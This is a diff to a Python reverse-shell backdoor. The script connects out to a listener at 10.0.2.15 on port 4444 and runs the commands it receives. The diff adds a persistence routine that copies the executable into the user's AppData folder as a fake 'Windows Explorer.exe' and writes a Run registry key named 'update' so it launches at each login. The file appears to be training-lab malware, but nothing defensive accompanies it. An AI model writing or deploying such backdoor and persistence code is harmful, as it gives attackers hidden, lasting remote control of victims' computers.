@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
-import socket, subprocess, time, json, os, base64, shutil
+import socket, subprocess, time, json, os, base64, shutil, sys
+
 
 class Backdoor:
 	def __init__(self, ip, port):
@@ -10,8 +11,11 @@ class Backdoor:
 		self.connection.connect((ip, port))
 
 	def become_persistent(self):
-		evil_file_location = os.environ['appdata'] + "\\Windows Explorer.exe"
-		
+		evil_file_location = os.environ['appdata'] + "\\Windows Explorer.exe"		# if python file: __file__ refer to current python file
+		if not os.path.exists(evil_file_location):
+			shutil.copyfile(sys.executable, evil_file_location)
+			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
+
 	def reliable_send(self, data):
 		json_data = json.dumps(data)
 		self.connection.send(json_data)
@@ -62,7 +66,8 @@ class Backdoor:
 				command_result = "[-] Error during command execution. (b)"
 			self.reliable_send(command_result)
 
-try:		
+
+try:
 	my_backdoor = Backdoor("10.0.2.15", 4444)
 	my_backdoor.run()
 except Exception:
